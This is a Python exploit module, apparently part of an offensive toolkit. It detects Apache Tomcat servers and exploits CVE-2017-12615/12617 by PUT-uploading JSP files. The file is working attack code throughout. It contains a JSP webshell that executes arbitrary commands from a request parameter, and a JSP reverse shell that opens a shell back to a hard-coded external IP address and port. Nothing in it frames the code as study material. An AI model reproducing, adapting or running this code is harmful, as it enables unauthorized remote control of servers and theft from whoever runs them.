import random
import string
import requests
from lib.color_handler import print_green, print_blue, print_red, print_yellow

def generate_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def check_tomcat(ip, port=False):
    tomcat_paths = [
        "",
        "/",
        f"/{generate_string()}",
        "/docs/introduction.html"
    ]

    protocols = ["http", "https"]
    ports = [f":{port}" if port else ""]
    for protocol in protocols:
        for port_suffix in ports:
            for path in tomcat_paths:
                url = f"{protocol}://{ip}{port_suffix}{path}"
                try:
                    response = requests.get(url, timeout=5, verify=False)
                    if any(
                        keyword in response.headers.get('Server', '').lower()
                        for keyword in ['tomcat']
                    ) or any(
                        keyword in response.text.lower()
                        for keyword in ['apache tomcat', '/manager/html', '/manager/status']
                    ):
                        print_green(f"Tomcat detected at {url}")
                        return True
                except requests.RequestException:
                    continue
    return False

def upload_primary_payload(main_url):
    print_blue("Attempting primary JSP payload upload (webshell)")
    primary_jsp_payload = '''
    <%@ page import="java.util.*,java.io.*"%>
    <%
    if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String line;
        while ((line = dis.readLine()) != null) {
            out.println(line);
        }
    }
    %>
    '''

    upload_url = f"{main_url}/{generate_string()}.jsp"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        response = requests.put(upload_url, data=primary_jsp_payload, headers=headers, timeout=10, verify=False)
        if response.status_code == 201:
            print_green(f"Primary JSP shell uploaded at {upload_url}")
            return upload_url
        else:
            print_red(f"Failed to upload primary JSP shell (status code: {response.status_code})")
    except requests.RequestException:
        print_red(f"Error during primary JSP upload")
    return None

def upload_secondary_payload(main_url):
    print_blue("Attempting secondary JSP payload upload (revshell)")
    secondary_jsp_payload = '''
    <%@ page import="java.util.*,java.io.*,java.net.*"%>
    <%
    class StreamConnector extends Thread {
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os) {
            this.is = is;
            this.os = os;
        }
        public void run() {
            BufferedReader reader = null;
            BufferedWriter writer = null;
            try {
                reader = new BufferedReader(new InputStreamReader(this.is));
                writer = new BufferedWriter(new OutputStreamWriter(this.os));
                char[] buffer = new char[8192];
                int length;
                while ((length = reader.read(buffer, 0, buffer.length)) > 0) {
                    writer.write(buffer, 0, length);
                    writer.flush();
                }
            } catch (Exception e) {
                // Handle exception
            } finally {
                try {
                    if (reader != null) reader.close();
                    if (writer != null) writer.close();
                } catch (Exception e) {
                    // Handle exception
                }
            }
        }
    }

    try {
        String shell = "/bin/sh";
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            shell = "cmd.exe";
        }
        Socket socket = new Socket("3.6.115.182", 11620);
        Process process = Runtime.getRuntime().exec(shell);
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
    } catch (Exception e) {
        // Handle exception
    }
    %>
    '''

    upload_url = f"{main_url}/{generate_string()}.jsp"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        response = requests.put(upload_url, data=secondary_jsp_payload, headers=headers, timeout=10, verify=False)
        if response.status_code == 201:
            print_green(f"Secondary JSP shell uploaded at {upload_url}")
            return upload_url
        else:
            print_red(f"Failed to upload secondary JSP shell (status code: {response.status_code})")
    except requests.RequestException:
        print_red(f"Error during secondary JSP upload")

    return None

def exploit_CVE_2017_12615_CVE_2017_12617(ip, port=None):
    if check_tomcat(ip, port):
        print_blue("Attempting CVE-2017-12615 & CVE-2017-12617 exploitation (JSP upload)")
        main_url = f"http://{ip}:{port}" if port else f"http://{ip}"
        upload_primary_payload(main_url)
        upload_secondary_payload(main_url)
